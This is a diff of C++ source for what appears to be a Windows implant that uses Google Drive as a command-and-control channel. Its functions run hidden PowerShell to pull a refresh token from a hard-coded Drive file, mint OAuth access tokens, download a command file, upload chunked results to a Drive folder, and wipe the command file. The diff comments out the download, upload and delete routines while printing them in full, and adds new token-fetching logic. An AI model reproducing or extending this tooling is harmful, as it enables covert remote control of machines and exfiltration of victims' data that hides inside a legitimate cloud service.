@@ -116,46 +116,56 @@ static MyString encoder(MyString W, int shift) {
 }
 //shifting strings for encoding
 
-static void handleFailsafe() {
-    // Simple handleFailsafe
-    FILE* file;
-   
-    char buffer[1024] = "Backup is empty";
-    int i = 0, delay = 0;
-    if (g_flag) // This flag is only for to handle if an old refresh token is on the Cloud
-    {
-        i = 7;
-    }
+//static void handleFailsafe() {
+//    // Simple handleFailsafe
+//    FILE* file;
+//   
+//    char buffer[1024] = "Backup is empty";
+//    int i = 0, delay = 0;
+//    if (g_flag) // This flag is only for to handle if an old refresh token is on the Cloud
+//    {
+//        i = 7;
+//    }
+//
+//    do{
+//        if (delay < FAILSAFE_THRESHOLD) {
+//            delay = expo(i++, 4) * 1000;
+//        }
+//        else
+//        {
+//            delay = FAILSAFE_THRESHOLD + 1;
+//        }
+//
+//        Sleep(delay);
+//
+//        file = _popen("powershell -c \"try{Write-Host -NoNewline (Invoke-Restmethod 'https://drive.google.com/uc?export=download&id=1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1' -TimeoutSec 30).RefreshToken}catch{Write-Host -NoNewline 400}\"", "r");
+//        fgets(buffer, 1024, file);
+//        if (buffer[0] == '1' && buffer[1] == '/' && buffer[2] == '/')
+//        {
+//            g_flag = true;
+//        }
+//    } while ((buffer[0] == 'B') && (buffer[14] == 'y'));
+//    g_refresh_token = *(new MyString(buffer));
+//    g_refresh_token = g_refresh_token.getSubString(0, g_refresh_token.getLength() - 1);
+//}
 
-    do{
-        if (delay < FAILSAFE_THRESHOLD) {
-            delay = expo(i++, 4) * 1000;
-        }
-        else
-        {
-            delay = FAILSAFE_THRESHOLD + 1;
-        }
-
-        Sleep(delay);
-
-        file = _popen(R"(powershell -c "try{(Invoke-Restmethod 'https://drive.google.com/uc?export=download&id=1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1' -TimeoutSec 30).RefreshToken}catch{})", "r");
-        fgets(buffer, 1024, file);
-        if (buffer[0] == '1' && buffer[1] == '/' && buffer[2] == '/')
-        {
-            g_flag = true;
-        }
-    } while ((buffer[0] == 'B') && (buffer[14] == 'y'));
-    g_refresh_token = *(new MyString(buffer));
-    g_refresh_token = g_refresh_token.getSubString(0, g_refresh_token.getLength() - 1);
-}
-
-static BYTE setNewAccessToken(std::string &accessToken) {
+/// <summary>
+/// This function is used to request and set a new accessToken.
+/// </summary>
+/// <param name="accessToken">A string to output Access Token</param>
+/// <param name="refreshToken">A string to just input Refresh Token</param>
+/// <returns>
+/// 200 OK!
+/// 400 Bad Request!
+/// </returns>
+static DWORD setNewAccessToken(std::string& accessToken, std::string refreshToken) {
 
     char* buffer = new char[1024];
-    sprintf_s(buffer, 1024, "powershell.exe -Command \"try{$headers = New-Object 'System.Collections.Generic.Dictionary[[String],[String]]'; $headers.Add('Host', 'oauth2.googleapis.com'); $headers.Add('Content-Type', 'application/x-www-form-urlencoded'); $body = 'client_id=%s&client_secret=%s&grant_type=refresh_token&refresh_token=%s'; $response = Invoke-RestMethod 'https://oauth2.googleapis.com/token' -Method 'POST' -Headers $headers -Body $body -TimeoutSec 30;Write-Host -NoNewline $response.access_token | ConvertTo-Json}catch{echo 4}\"",g_client_id.c_str(), g_client_secret.c_str(), g_refresh_token.c_str());
+    sprintf_s(buffer, 1024, "powershell.exe -Command \"try{$headers = New-Object 'System.Collections.Generic.Dictionary[[String],[String]]'; $headers.Add('Host', 'oauth2.googleapis.com'); $headers.Add('Content-Type', 'application/x-www-form-urlencoded'); $body = 'client_id=%s&client_secret=%s&grant_type=refresh_token&refresh_token=%s'; $response = Invoke-RestMethod 'https://oauth2.googleapis.com/token' -Method 'POST' -Headers $headers -Body $body -TimeoutSec 30;Write-Host -NoNewline $response.access_token | ConvertTo-Json}catch{echo 4}\"", g_client_id.c_str(), g_client_secret.c_str(), refreshToken.c_str());
 
     FILE* file = _popen(buffer, "r");
     fgets(buffer, 1023, file);
+    
     if (buffer[0] == '4')
     {
         delete[] buffer;
@@ -168,67 +178,119 @@ static BYTE setNewAccessToken(std::string &accessToken) {
     delete[] buffer;
     return 200;
 }
-// Get Token
 
-static MyString downloadContext() {
+/// <summary>
+/// This method is going to get used in handling failsafe situation.
+/// </summary>
+/// <param name="refreshToken">A string to output Refresh Token</param>
+/// <param name="accessToken">A string to output Access Token</param>
+/// <returns>
+/// 200 OK!
+/// 204 No Content!
+/// 400 Bad Request!
+/// 403 Forbidden!
+/// 406 Not Acceptable!
+/// </returns>
+static DWORD setNewRefreshAndAccessToken(std::string &refreshToken, std::string &accessToken) {
     char* buffer = new char[1024];
-    snprintf(buffer, 1024, "powershell.exe -c \"try {Write-Host -NoNewline(Invoke-RestMethod 'https://www.googleapis.com/drive/v3/files/1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er?alt=media&acknowledgeAbuse=true&mimeType=text/plain' -TimeoutSec 30 -Method 'GET' -Headers @{'Authorization' = 'Bearer %s'}) }catch{echo 4}\"", g_access_token.getContext());
-    FILE* file = _popen(buffer, "r");
-    MyString output = "";
-    while (fgets(buffer, 1024, file) != NULL) {
-        output = output + buffer;
-    }
-    if (output.getCharAt(0) == '4') {
-        g_access_token = setNewAccessToken();
+    memcpy(buffer, "It's empty!", 12);
+
+    FILE* file = _popen("powershell -c \"try{Write-Host -NoNewline (Invoke-Restmethod 'https://drive.google.com/uc?export=download&id=1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1' -TimeoutSec 30).RefreshToken}catch{Write-Host -NoNewline 400}\"", "r");
+    
+    fgets(buffer, 1023, file);
+
+    if (buffer[0] == 'I' && buffer[10] == '!') {
+
         delete[] buffer;
-        return downloadContext();
+        return 204;
     }
+    else if (buffer[0] == '4') {
 
-    _pclose(file);
-    delete[] buffer;
-    return output;
-}
-//Download
-
-static void upload(MyString data) {
-    char* buffer = new char[7000];
-    double tmp = static_cast<double>(data.getLength()) / 6000;
-    int i = ceil(tmp);
-    int subIndex = 0;
-    for (size_t j = 0; j < i; j++)
-    {
-        snprintf(buffer, 7000, "powershell.exe -c \"try {Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/?uploadType=multipart&access_token=%s' -Method 'POST' -TimeoutSec 30 -Headers @{'Content-Type' = 'multipart/related; boundary=boundary'} -Body \\\"`n--boundary`nContent-Type: application/json; charset=UTF-8`n`n{`\\\"name`\\\": `\\\"Result#%d_%d.txt`\\\",`\\\"mimeType`\\\": `\\\"text/plain`\\\",`\\\"parents`\\\": [`\\\"%s`\\\"]}`n`n--boundary`nContent-Type: text/plain`n`n%s`n--boundary--\\\"}catch{echo 4}\"", g_access_token.getContext(), index, subIndex, g_result_folder_id.getContext(), data.getSubString(j * 6000, j == i - 1 ? data.getLength() : (j + 1) * 6000).getContext());
-        FILE* file = _popen(buffer, "r");
-        char temp_buffer[1024];
-        MyString output = "";
-        while (fgets(temp_buffer, sizeof(temp_buffer), file) != NULL) {
-            output = output + temp_buffer;
-        }
-        if (output.getCharAt(0) == '4') {
-            g_access_token = setNewAccessToken();
-            j--;
-        }
-        subIndex++;
-        _pclose(file);
-    }
-    delete[] buffer;
-    index++;
-}
-//Upload
-static boolean deleteContext() {
-    char* buffer = new char[512];
-    snprintf(buffer, 512, "powershell.exe -c \"try{Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er?access_token=%s' -Method 'PATCH' -TimeoutSec 30}catch{echo 4}\"", g_access_token.getContext());
-    FILE* file = _popen(buffer, "r");
-    delete[] buffer;
-    buffer = new char[2];
-
-    fgets(buffer, 2, file);
-    if (buffer[0] == '4') {
-        g_access_token = setNewAccessToken();
         delete[] buffer;
-        return deleteContext();
+        return 400;
     }
-    _pclose(file);
-    delete[] buffer;
-    return true;
+    else {
+        if (buffer[0] == '1' && buffer[1] == '/' && buffer[2] == '/')
+        {
+            refreshToken = buffer;
+            delete[] buffer;
+            if (setNewAccessToken(accessToken, refreshToken) == 200)
+            {
+                return 200;
+            }
+            else {
+                return 403;
+            }
+        }
+        else {
+
+            delete[] buffer;
+            return 406;
+        }
+    }
 }
+
+
+
+//static MyString downloadContext() {
+//    char* buffer = new char[1024];
+//    snprintf(buffer, 1024, "powershell.exe -c \"try {Write-Host -NoNewline(Invoke-RestMethod 'https://www.googleapis.com/drive/v3/files/1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er?alt=media&acknowledgeAbuse=true&mimeType=text/plain' -TimeoutSec 30 -Method 'GET' -Headers @{'Authorization' = 'Bearer %s'}) }catch{echo 4}\"", g_access_token.getContext());
+//    FILE* file = _popen(buffer, "r");
+//    MyString output = "";
+//    while (fgets(buffer, 1024, file) != NULL) {
+//        output = output + buffer;
+//    }
+//    if (output.getCharAt(0) == '4') {
+//        g_access_token = setNewAccessToken();
+//        delete[] buffer;
+//        return downloadContext();
+//    }
+//
+//    _pclose(file);
+//    delete[] buffer;
+//    return output;
+//}
+////Download
+//
+//static void upload(MyString data) {
+//    char* buffer = new char[7000];
+//    double tmp = static_cast<double>(data.getLength()) / 6000;
+//    int i = ceil(tmp);
+//    int subIndex = 0;
+//    for (size_t j = 0; j < i; j++)
+//    {
+//        snprintf(buffer, 7000, "powershell.exe -c \"try {Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/?uploadType=multipart&access_token=%s' -Method 'POST' -TimeoutSec 30 -Headers @{'Content-Type' = 'multipart/related; boundary=boundary'} -Body \\\"`n--boundary`nContent-Type: application/json; charset=UTF-8`n`n{`\\\"name`\\\": `\\\"Result#%d_%d.txt`\\\",`\\\"mimeType`\\\": `\\\"text/plain`\\\",`\\\"parents`\\\": [`\\\"%s`\\\"]}`n`n--boundary`nContent-Type: text/plain`n`n%s`n--boundary--\\\"}catch{echo 4}\"", g_access_token.getContext(), index, subIndex, g_result_folder_id.getContext(), data.getSubString(j * 6000, j == i - 1 ? data.getLength() : (j + 1) * 6000).getContext());
+//        FILE* file = _popen(buffer, "r");
+//        char temp_buffer[1024];
+//        MyString output = "";
+//        while (fgets(temp_buffer, sizeof(temp_buffer), file) != NULL) {
+//            output = output + temp_buffer;
+//        }
+//        if (output.getCharAt(0) == '4') {
+//            g_access_token = setNewAccessToken();
+//            j--;
+//        }
+//        subIndex++;
+//        _pclose(file);
+//    }
+//    delete[] buffer;
+//    index++;
+//}
+////Upload
+//static boolean deleteContext() {
+//    char* buffer = new char[512];
+//    snprintf(buffer, 512, "powershell.exe -c \"try{Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er?access_token=%s' -Method 'PATCH' -TimeoutSec 30}catch{echo 4}\"", g_access_token.getContext());
+//    FILE* file = _popen(buffer, "r");
+//    delete[] buffer;
+//    buffer = new char[2];
+//
+//    fgets(buffer, 2, file);
+//    if (buffer[0] == '4') {
+//        g_access_token = setNewAccessToken();
+//        delete[] buffer;
+//        return deleteContext();
+//    }
+//    _pclose(file);
+//    delete[] buffer;
+//    return true;
+//}
